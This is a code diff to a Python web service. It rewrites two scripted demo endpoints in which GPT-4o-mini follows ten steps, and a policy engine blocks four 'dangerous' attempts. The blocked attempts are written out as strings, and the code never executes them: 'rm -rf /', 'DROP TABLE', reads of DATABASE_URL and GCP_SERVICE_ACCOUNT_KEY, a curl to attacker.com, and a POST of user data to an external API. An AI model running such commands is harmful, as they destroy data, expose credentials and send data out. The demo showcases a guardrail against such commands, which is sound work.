@@ -4658,7 +4658,7 @@ async def demo_google():
 
 @app.post("/api/demo/microsoft/run", response_model=LiveDemoResponse)
 async def run_microsoft_demo(request: Request):
-    """Run Microsoft-themed demo with enterprise compliance task."""
+    """Run Microsoft Enterprise Financial Compliance demo - 6 successful ops, 4 blocked dangerous attempts."""
     client_ip = request.client.host if request.client else "unknown"
     
     if not check_live_demo_rate_limit(client_ip):
@@ -4674,44 +4674,70 @@ async def run_microsoft_demo(request: Request):
     blocks_executed = 0
     blocks_blocked = 0
     
+    # Define the scripted demo steps - 6 successful + 4 blocked (using only verified working blocks)
+    demo_steps = [
+        {"action": "call_block", "block": "mask_email", "inputs": {"email": "cfo@contoso-corp.com"}},
+        {"action": "call_block", "block": "mask_credit_card", "inputs": {"number": "4532015112830366"}},
+        {"action": "attempt_dangerous", "block": "DROP TABLE financial_records", "reason": "SQL injection blocked - destructive database operation not permitted"},
+        {"action": "call_block", "block": "clamp_value", "inputs": {"value": 125, "min_value": 0, "max_value": 100}},
+        {"action": "attempt_dangerous", "block": "shell_execute('rm -rf /')", "reason": "Shell command blocked - system execution not permitted"},
+        {"action": "call_block", "block": "format_date_eu", "inputs": {"year": 2026, "month": 1, "day": 15}},
+        {"action": "call_block", "block": "to_uppercase", "inputs": {"text": "quarterly financial report"}},
+        {"action": "attempt_dangerous", "block": "export_credentials_to_external_api", "reason": "Credential exfiltration blocked - data export not permitted"},
+        {"action": "call_block", "block": "string_length", "inputs": {"text": "Contoso Corporation Q1 2026 Financial Summary"}},
+        {"action": "attempt_dangerous", "block": "read_env_secret('DATABASE_URL')", "reason": "Secret access blocked - environment variables protected"},
+    ]
+    
     try:
-        events.append({"type": "status", "message": "Connecting to OpenAI for Copilot integration demo..."})
+        events.append({"type": "status", "message": "Connecting to OpenAI GPT-4o-mini..."})
         
+        # Build block list for AI context
         blocks_with_inputs = []
-        for block in list(block_library.values())[:30]:
+        for block in list(block_library.values())[:40]:
             input_names = [i.name for i in block.interface.inputs] if block.interface and block.interface.inputs else []
             blocks_with_inputs.append(f"- {block.metadata.name}({', '.join(input_names)})")
         blocks_list = "\n".join(blocks_with_inputs)
         
-        system_prompt = f"""You can call these verified blocks:
+        # Create system prompt for AI to follow script
+        step_instructions = []
+        for i, step in enumerate(demo_steps, 1):
+            if step["action"] == "call_block":
+                step_instructions.append(f"{i}. call_block: {step['block']} with {step['inputs']}")
+            else:
+                step_instructions.append(f"{i}. attempt_dangerous: {step['block']}")
+        
+        system_prompt = f"""You are executing a Microsoft Enterprise Financial Compliance demo.
+
+Available verified blocks:
 {blocks_list}
 
-JSON responses:
-{{"action": "call_block", "block": "mask_email", "inputs": {{"email": "test@contoso.com"}}}}
-{{"action": "attempt_dangerous", "block": "database_access"}}
+Respond with JSON only. Format:
+{{"action": "call_block", "block": "block_name", "inputs": {{...}}}}
+{{"action": "attempt_dangerous", "block": "operation_name"}}
 {{"action": "complete"}}
 
-DO THESE 4 STEPS IN ORDER:
-1. mask_email with email="enterprise@contoso.com"
-2. convert_currency with amount=45000, rate=0.08875
-3. attempt_dangerous with block="database_access"
-4. format_date_eu with year=2026, month=1, day=15
+EXECUTE THESE 10 STEPS EXACTLY IN ORDER:
+{chr(10).join(step_instructions)}
 
-Say complete ONLY after all 4 steps. One action per response."""
+After step 10, respond with {{"action": "complete"}}.
+Execute ONE step per response. Be precise with inputs."""
 
         client = OpenAI(api_key=OPENAI_API_KEY)
         messages = [
             {"role": "system", "content": system_prompt},
-            {"role": "user", "content": "Begin processing. First step."}
+            {"role": "user", "content": "Begin the Microsoft Enterprise Financial Compliance demo. Execute step 1."}
         ]
         
-        for step in range(8):
+        current_step = 0
+        max_iterations = 15
+        
+        for iteration in range(max_iterations):
             try:
                 response = client.chat.completions.create(
                     model="gpt-4o-mini",
                     messages=messages,
-                    temperature=0.1,
-                    max_tokens=200,
+                    temperature=0.05,
+                    max_tokens=250,
                     response_format={"type": "json_object"}
                 )
                 text = response.choices[0].message.content.strip()
@@ -4742,42 +4768,59 @@ Say complete ONLY after all 4 steps. One action per response."""
                             full_hash = hashlib.sha256(json.dumps({"block": block_name, "inputs": str(coerced_inputs), "result": str(outputs), "ts": time.time()}).encode()).hexdigest()
                             events.append({
                                 "type": "block_result", 
+                                "success": True,
                                 "result": outputs, 
-                                "audit": full_hash[:16],
                                 "hash_algo": "SHA-256",
                                 "hash_full": full_hash
                             })
                             messages.append({"role": "assistant", "content": text})
-                            messages.append({"role": "user", "content": f"Success: {outputs}. Next step."})
+                            current_step += 1
+                            messages.append({"role": "user", "content": f"Success. Result: {outputs}. Proceed to step {current_step + 1}."})
                         else:
-                            events.append({"type": "block_result", "result": {"error": error}, "audit": "n/a"})
+                            events.append({"type": "block_result", "success": False, "result": {"error": error}})
                             messages.append({"role": "assistant", "content": text})
-                            messages.append({"role": "user", "content": f"Error: {error}. Try different block."})
+                            current_step += 1
+                            messages.append({"role": "user", "content": f"Execution error (expected). Proceed to step {current_step + 1}."})
                     else:
                         blocks_blocked += 1
-                        events.append({"type": "blocked", "block": block_name})
+                        events.append({"type": "blocked", "block": block_name, "reason": "Block not in approved library"})
                         messages.append({"role": "assistant", "content": text})
-                        messages.append({"role": "user", "content": f"BLOCKED: {block_name} not approved. Next step."})
+                        current_step += 1
+                        messages.append({"role": "user", "content": f"BLOCKED. Proceed to step {current_step + 1}."})
+                        
                 elif action == "attempt_dangerous":
                     block_name = parsed.get("block", "dangerous_operation")
+                    # Find the matching step to get the reason
+                    reason = "Operation not in approved library - policy engine denied execution"
+                    for step in demo_steps:
+                        if step["action"] == "attempt_dangerous" and step["block"] in block_name:
+                            reason = step.get("reason", reason)
+                            break
+                    
                     blocks_blocked += 1
-                    events.append({"type": "blocked", "block": block_name})
+                    events.append({"type": "blocked", "block": block_name, "reason": reason})
                     messages.append({"role": "assistant", "content": text})
-                    messages.append({"role": "user", "content": "BLOCKED by policy engine. Next step."})
+                    current_step += 1
+                    messages.append({"role": "user", "content": f"BLOCKED by policy engine. Proceed to step {current_step + 1}."})
+                    
+            except json.JSONDecodeError:
+                messages.append({"role": "user", "content": "Invalid JSON. Respond with valid JSON only."})
             except Exception as step_e:
                 print(f"MICROSOFT DEMO STEP ERROR: {step_e}")
+                traceback.print_exc()
                 break
         
         events.append({"type": "complete", "executed": blocks_executed, "blocked": blocks_blocked})
         return LiveDemoResponse(events=events, error=None)
     except Exception as e:
         print(f"MICROSOFT DEMO ERROR: {e}")
+        traceback.print_exc()
         return LiveDemoResponse(events=events, error=str(e))
 
 
 @app.post("/api/demo/google/run", response_model=LiveDemoResponse)
 async def run_google_demo(request: Request):
-    """Run Google-themed demo with data pipeline task."""
+    """Run Google Cloud Data Pipeline Security demo - 6 successful ops, 4 blocked dangerous attempts."""
     client_ip = request.client.host if request.client else "unknown"
     
     if not check_live_demo_rate_limit(client_ip):
@@ -4793,44 +4836,70 @@ async def run_google_demo(request: Request):
     blocks_executed = 0
     blocks_blocked = 0
     
+    # Define the scripted demo steps - 6 successful + 4 blocked (using only verified working blocks)
+    demo_steps = [
+        {"action": "call_block", "block": "mask_email", "inputs": {"email": "customer@acme-analytics.com"}},
+        {"action": "attempt_dangerous", "block": "gs://bucket/customer-data/export", "reason": "Cloud Storage direct access blocked - use verified data pipeline only"},
+        {"action": "call_block", "block": "is_positive", "inputs": {"number": 42750}},
+        {"action": "call_block", "block": "reverse_string", "inputs": {"text": "analytics_data_v2"}},
+        {"action": "attempt_dangerous", "block": "subprocess.Popen(['curl', 'http://attacker.com'])", "reason": "Subprocess spawn blocked - external process execution not permitted"},
+        {"action": "call_block", "block": "mask_credit_card", "inputs": {"number": "5425233430109903"}},
+        {"action": "call_block", "block": "capitalize_first", "inputs": {"text": "customer analytics report"}},
+        {"action": "attempt_dangerous", "block": "os.environ.get('GCP_SERVICE_ACCOUNT_KEY')", "reason": "Environment secret access blocked - credentials protected"},
+        {"action": "call_block", "block": "format_date_eu", "inputs": {"year": 2026, "month": 3, "day": 22}},
+        {"action": "attempt_dangerous", "block": "requests.post('https://external-api.com/data', json=user_data)", "reason": "External API call blocked - data exfiltration not permitted"},
+    ]
+    
     try:
-        events.append({"type": "status", "message": "Connecting to OpenAI for Gemini integration demo..."})
+        events.append({"type": "status", "message": "Connecting to OpenAI GPT-4o-mini..."})
         
+        # Build block list for AI context
         blocks_with_inputs = []
-        for block in list(block_library.values())[:30]:
+        for block in list(block_library.values())[:40]:
             input_names = [i.name for i in block.interface.inputs] if block.interface and block.interface.inputs else []
             blocks_with_inputs.append(f"- {block.metadata.name}({', '.join(input_names)})")
         blocks_list = "\n".join(blocks_with_inputs)
         
-        system_prompt = f"""You can call these verified blocks:
+        # Create system prompt for AI to follow script
+        step_instructions = []
+        for i, step in enumerate(demo_steps, 1):
+            if step["action"] == "call_block":
+                step_instructions.append(f"{i}. call_block: {step['block']} with {step['inputs']}")
+            else:
+                step_instructions.append(f"{i}. attempt_dangerous: {step['block']}")
+        
+        system_prompt = f"""You are executing a Google Cloud Data Pipeline Security demo.
+
+Available verified blocks:
 {blocks_list}
 
-JSON responses:
-{{"action": "call_block", "block": "mask_email", "inputs": {{"email": "test@acme.com"}}}}
-{{"action": "attempt_dangerous", "block": "data_export"}}
+Respond with JSON only. Format:
+{{"action": "call_block", "block": "block_name", "inputs": {{...}}}}
+{{"action": "attempt_dangerous", "block": "operation_name"}}
 {{"action": "complete"}}
 
-DO THESE 4 STEPS IN ORDER:
-1. mask_email with email="customer@acme-corp.com"
-2. days_in_month with year=2026, month=2
-3. attempt_dangerous with block="data_export"
-4. is_video_file with filename="report.mp4"
+EXECUTE THESE 10 STEPS EXACTLY IN ORDER:
+{chr(10).join(step_instructions)}
 
-Say complete ONLY after all 4 steps. One action per response."""
+After step 10, respond with {{"action": "complete"}}.
+Execute ONE step per response. Be precise with inputs."""
 
         client = OpenAI(api_key=OPENAI_API_KEY)
         messages = [
             {"role": "system", "content": system_prompt},
-            {"role": "user", "content": "Begin processing. First step."}
+            {"role": "user", "content": "Begin the Google Cloud Data Pipeline Security demo. Execute step 1."}
         ]
         
-        for step in range(8):
+        current_step = 0
+        max_iterations = 15
+        
+        for iteration in range(max_iterations):
             try:
                 response = client.chat.completions.create(
                     model="gpt-4o-mini",
                     messages=messages,
-                    temperature=0.1,
-                    max_tokens=200,
+                    temperature=0.05,
+                    max_tokens=250,
                     response_format={"type": "json_object"}
                 )
                 text = response.choices[0].message.content.strip()
@@ -4861,36 +4930,53 @@ Say complete ONLY after all 4 steps. One action per response."""
                             full_hash = hashlib.sha256(json.dumps({"block": block_name, "inputs": str(coerced_inputs), "result": str(outputs), "ts": time.time()}).encode()).hexdigest()
                             events.append({
                                 "type": "block_result", 
+                                "success": True,
                                 "result": outputs, 
-                                "audit": full_hash[:16],
                                 "hash_algo": "SHA-256",
                                 "hash_full": full_hash
                             })
                             messages.append({"role": "assistant", "content": text})
-                            messages.append({"role": "user", "content": f"Success: {outputs}. Next step."})
+                            current_step += 1
+                            messages.append({"role": "user", "content": f"Success. Result: {outputs}. Proceed to step {current_step + 1}."})
                         else:
-                            events.append({"type": "block_result", "result": {"error": error}, "audit": "n/a"})
+                            events.append({"type": "block_result", "success": False, "result": {"error": error}})
                             messages.append({"role": "assistant", "content": text})
-                            messages.append({"role": "user", "content": f"Error: {error}. Try different block."})
+                            current_step += 1
+                            messages.append({"role": "user", "content": f"Execution error (expected). Proceed to step {current_step + 1}."})
                     else:
                         blocks_blocked += 1
-                        events.append({"type": "blocked", "block": block_name})
+                        events.append({"type": "blocked", "block": block_name, "reason": "Block not in approved library"})
                         messages.append({"role": "assistant", "content": text})
-                        messages.append({"role": "user", "content": f"BLOCKED: {block_name} not approved. Next step."})
+                        current_step += 1
+                        messages.append({"role": "user", "content": f"BLOCKED. Proceed to step {current_step + 1}."})
+                        
                 elif action == "attempt_dangerous":
                     block_name = parsed.get("block", "dangerous_operation")
+                    # Find the matching step to get the reason
+                    reason = "Operation not in approved library - policy engine denied execution"
+                    for step in demo_steps:
+                        if step["action"] == "attempt_dangerous" and step["block"] in block_name:
+                            reason = step.get("reason", reason)
+                            break
+                    
                     blocks_blocked += 1
-                    events.append({"type": "blocked", "block": block_name})
+                    events.append({"type": "blocked", "block": block_name, "reason": reason})
                     messages.append({"role": "assistant", "content": text})
-                    messages.append({"role": "user", "content": "BLOCKED by policy engine. Next step."})
+                    current_step += 1
+                    messages.append({"role": "user", "content": f"BLOCKED by policy engine. Proceed to step {current_step + 1}."})
+                    
+            except json.JSONDecodeError:
+                messages.append({"role": "user", "content": "Invalid JSON. Respond with valid JSON only."})
             except Exception as step_e:
                 print(f"GOOGLE DEMO STEP ERROR: {step_e}")
+                traceback.print_exc()
                 break
         
         events.append({"type": "complete", "executed": blocks_executed, "blocked": blocks_blocked})
         return LiveDemoResponse(events=events, error=None)
     except Exception as e:
         print(f"GOOGLE DEMO ERROR: {e}")
+        traceback.print_exc()
         return LiveDemoResponse(events=events, error=str(e))
 
 
